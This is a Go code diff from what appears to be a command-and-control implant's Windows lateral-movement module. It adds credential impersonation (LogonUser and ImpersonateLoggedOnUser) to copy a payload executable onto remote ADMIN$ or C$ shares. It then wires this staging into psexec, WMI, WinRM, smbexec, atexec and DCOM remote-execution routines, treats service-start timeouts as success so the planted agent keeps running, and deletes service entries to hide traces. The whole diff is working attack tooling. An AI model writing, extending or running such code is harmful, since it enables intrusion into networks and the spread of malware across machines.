@@ -6,6 +6,7 @@ import (
 	"fmt"
 	"net"
 	"os"
+	"runtime"
 	"strings"
 	"syscall"
 	"time"
@@ -58,57 +59,75 @@ func splitDomainUser(u string) (string, string) {
 	return ".", u
 }
 
-// lateralAuth pre-authenticates to \\host\IPC$ with explicit creds so all
-// subsequent SMB operations in this process reuse the authenticated session.
-// Uses the WNetAddConnection2W procs already loaded in transport_smb_windows.go.
-func lateralAuth(host, user, pass string) {
-	if user == "" || pass == "" {
-		return
-	}
-	ipcPath := `\\` + host + `\IPC$`
-	lpRemote, _ := syscall.UTF16PtrFromString(ipcPath)
-	lpUser, _ := syscall.UTF16PtrFromString(user)
-	lpPass, _ := syscall.UTF16PtrFromString(pass)
-	nr := netResource{dwType: resourceTypeAny, lpRemoteName: uintptr(unsafe.Pointer(lpRemote))}
-	// Try to add the IPC$ connection with provided creds.
-	// If already connected as a different user (error 1219), cancel the
-	// existing IPC$ connection only (fForce=0, won't tear down ADMIN$)
-	// then retry. Never force-close with fForce=1 which can kill ADMIN$
-	// tree connects sharing the same TCP session.
-	ret, _, _ := procWNetAddConn2W.Call(
-		uintptr(unsafe.Pointer(&nr)),
-		uintptr(unsafe.Pointer(lpPass)),
-		uintptr(unsafe.Pointer(lpUser)),
-		0,
+// smbWriteAs writes data to a UNC path using explicit credentials via
+// LogonUser(LOGON32_LOGON_NEW_CREDENTIALS=9) + ImpersonateLoggedOnUser.
+// This works from any security context including SYSTEM/service where
+// WNetAddConnection2W fails with ERROR_NO_SUCH_LOGON_SESSION (1312).
+// Uses procLogonUserW / procImpersonateLoggedOnUser from commands_windows.go.
+func smbWriteAs(uncPath string, data []byte, user, pass string) error {
+	// Pin this goroutine to the current OS thread so that ImpersonateLoggedOnUser
+	// (which sets a per-thread token) applies to the os.WriteFile syscall below.
+	// Without this, Go's runtime may migrate the goroutine to a different thread
+	// mid-function and the impersonation token would not carry over.
+	runtime.LockOSThread()
+	defer runtime.UnlockOSThread()
+
+	dom, usr := splitDomainUser(user)
+	usrPtr, _ := windows.UTF16PtrFromString(usr)
+	domPtr, _ := windows.UTF16PtrFromString(dom)
+	passPtr, _ := windows.UTF16PtrFromString(pass)
+
+	// Type 9 = LOGON32_LOGON_NEW_CREDENTIALS: keeps local identity but uses
+	// provided credentials for all outbound network authentication.
+	var tok windows.Token
+	r, _, e := procLogonUserW.Call(
+		uintptr(unsafe.Pointer(usrPtr)),
+		uintptr(unsafe.Pointer(domPtr)),
+		uintptr(unsafe.Pointer(passPtr)),
+		9, // LOGON32_LOGON_NEW_CREDENTIALS
+		0, // LOGON32_PROVIDER_DEFAULT
+		uintptr(unsafe.Pointer(&tok)),
 	)
-	const ERROR_SESSION_CREDENTIAL_CONFLICT = 1219
-	if ret == ERROR_SESSION_CREDENTIAL_CONFLICT {
-		// Cancel IPC$ without force to free the credential slot, then retry
-		lpCancel, _ := syscall.UTF16PtrFromString(ipcPath)
-		procWNetCancelConn2.Call(uintptr(unsafe.Pointer(lpCancel)), 0, 0)
-		procWNetAddConn2W.Call(
-			uintptr(unsafe.Pointer(&nr)),
-			uintptr(unsafe.Pointer(lpPass)),
-			uintptr(unsafe.Pointer(lpUser)),
-			0,
-		)
+	if r == 0 {
+		return fmt.Errorf("logon(%s\\%s): %w", dom, usr, e)
 	}
+	defer windows.CloseHandle(windows.Handle(tok))
+
+	r, _, e = procImpersonateLoggedOnUser.Call(uintptr(tok))
+	if r == 0 {
+		return fmt.Errorf("impersonate: %w", e)
+	}
+	defer procRevertToSelf2.Call()
+
+	return os.WriteFile(uncPath, data, 0644)
 }
 
-// smbStage writes data to \\host\ADMIN$\<name> (C:\Windows\<name>) or
-// falls back to \\host\C$\Windows\Temp\<name>. Returns the local path
-// the remote process will see when it executes.
-// It tries with the existing Windows session first (preserving live connections),
-// and only falls back to the C$ path if ADMIN$ is unavailable.
-func smbStage(host, name string, data []byte) (string, error) {
+// smbStage stages data to \\host\ADMIN$\<name> or \\host\C$\Windows\Temp\<name>.
+// It first tries the existing session (fastest, works when the caller already
+// has access), then falls back to explicit-credential impersonation when
+// user/pass are provided. Works in service and SYSTEM contexts.
+func smbStage(host, name, user, pass string, data []byte) (string, error) {
 	unc1 := `\\` + host + `\ADMIN$\` + name
+	unc2 := `\\` + host + `\C$\Windows\Temp\` + name
+
+	// Try with current credentials first.
 	if err := os.WriteFile(unc1, data, 0644); err == nil {
 		return `C:\Windows\` + name, nil
 	}
-	unc2 := `\\` + host + `\C$\Windows\Temp\` + name
 	if err := os.WriteFile(unc2, data, 0644); err == nil {
 		return `C:\Windows\Temp\` + name, nil
 	}
+
+	// Fall back to impersonation with explicit credentials.
+	if user != "" && pass != "" {
+		if err := smbWriteAs(unc1, data, user, pass); err == nil {
+			return `C:\Windows\` + name, nil
+		}
+		if err := smbWriteAs(unc2, data, user, pass); err == nil {
+			return `C:\Windows\Temp\` + name, nil
+		}
+	}
+
 	return "", fmt.Errorf("stage to %s: ADMIN$ and C$\\Windows\\Temp both failed (check share access)", host)
 }
 
@@ -124,12 +143,7 @@ func lateralPSExec(host string, data []byte, svcName, user, pass string) (string
 	}
 	exeName := svcName + ".exe"
 
-	// Try to stage using any existing Windows session first; only auth if needed.
-	localPath, err := smbStage(host, exeName, data)
-	if err != nil {
-		lateralAuth(host, user, pass)
-		localPath, err = smbStage(host, exeName, data)
-	}
+	localPath, err := smbStage(host, exeName, user, pass, data)
 	if err != nil {
 		return "", fmt.Errorf("psexec: %w", err)
 	}
@@ -165,9 +179,13 @@ func lateralPSExec(host string, data []byte, svcName, user, pass string) (string
 	defer procCloseServiceHandleLat.Call(svc)
 
 	r, _, e := procStartServiceW.Call(svc, 0, 0)
-	procDeleteServiceLat.Call(svc) // clean up SCM entry; process keeps running
+	procDeleteServiceLat.Call(svc) // clean up SCM entry; process continues running
 	if r == 0 {
-		return "", fmt.Errorf("psexec StartService %s: %w", host, e)
+		// 1053 = ERROR_SERVICE_REQUEST_TIMEOUT — binary started but never called
+		// SetServiceStatus(SERVICE_RUNNING). The process is alive; treat as success.
+		if errno, ok := e.(syscall.Errno); !ok || errno != 1053 {
+			return "", fmt.Errorf("psexec StartService %s: %w", host, e)
+		}
 	}
 
 	return fmt.Sprintf("[+] psexec → %s\n    svc : %s\n    path: %s", host, svcName, localPath), nil
@@ -183,12 +201,7 @@ func lateralWMI(host string, data []byte, svcName, user, pass string) (string, e
 	}
 	exeName := svcName + ".exe"
 
-	// Try to stage using any existing Windows session first; only auth if needed.
-	localPath, err := smbStage(host, exeName, data)
-	if err != nil {
-		lateralAuth(host, user, pass)
-		localPath, err = smbStage(host, exeName, data)
-	}
+	localPath, err := smbStage(host, exeName, user, pass, data)
 	if err != nil {
 		return "", fmt.Errorf("wmi: %w", err)
 	}
@@ -219,12 +232,7 @@ func lateralWinRM(host string, data []byte, svcName, user, pass string) (string,
 	}
 	exeName := svcName + ".exe"
 
-	// Try to stage using any existing Windows session first; only auth if needed.
-	localPath, err := smbStage(host, exeName, data)
-	if err != nil {
-		lateralAuth(host, user, pass)
-		localPath, err = smbStage(host, exeName, data)
-	}
+	localPath, err := smbStage(host, exeName, user, pass, data)
 	if err != nil {
 		return "", fmt.Errorf("winrm: %w", err)
 	}
@@ -338,12 +346,7 @@ func lateralSMBExec(host string, data []byte, svcName, user, pass string) (strin
 	}
 	exeName := svcName + ".exe"
 
-	// Try to stage using any existing Windows session first; only auth if needed.
-	localPath, err := smbStage(host, exeName, data)
-	if err != nil {
-		lateralAuth(host, user, pass)
-		localPath, err = smbStage(host, exeName, data)
-	}
+	localPath, err := smbStage(host, exeName, user, pass, data)
 	if err != nil {
 		return "", fmt.Errorf("smbexec: %w", err)
 	}
@@ -387,7 +390,9 @@ func lateralSMBExec(host string, data []byte, svcName, user, pass string) (strin
 	r, _, e := procStartServiceW.Call(svc, 0, 0)
 	procDeleteServiceLat.Call(svc)
 	if r == 0 {
-		return "", fmt.Errorf("smbexec StartService %s: %w", host, e)
+		if errno, ok := e.(syscall.Errno); !ok || errno != 1053 {
+			return "", fmt.Errorf("smbexec StartService %s: %w", host, e)
+		}
 	}
 
 	return fmt.Sprintf("[+] smbexec → %s\n    svc : %s\n    path: %s\n    chain: SERVICES.EXE→cmd.exe→agent", host, svcName, localPath), nil
@@ -406,12 +411,7 @@ func lateralATExec(host string, data []byte, svcName, user, pass string) (string
 	}
 	exeName := svcName + ".exe"
 
-	// Try to stage using any existing Windows session first; only auth if needed.
-	localPath, err := smbStage(host, exeName, data)
-	if err != nil {
-		lateralAuth(host, user, pass)
-		localPath, err = smbStage(host, exeName, data)
-	}
+	localPath, err := smbStage(host, exeName, user, pass, data)
 	if err != nil {
 		return "", fmt.Errorf("atexec: %w", err)
 	}
@@ -461,12 +461,7 @@ func lateralDCOM(host string, data []byte, svcName, user, pass string) (string, 
 	}
 	exeName := svcName + ".exe"
 
-	// Try to stage using any existing Windows session first; only auth if needed.
-	localPath, err := smbStage(host, exeName, data)
-	if err != nil {
-		lateralAuth(host, user, pass)
-		localPath, err = smbStage(host, exeName, data)
-	}
+	localPath, err := smbStage(host, exeName, user, pass, data)
 	if err != nil {
 		return "", fmt.Errorf("dcom: %w", err)
 	}
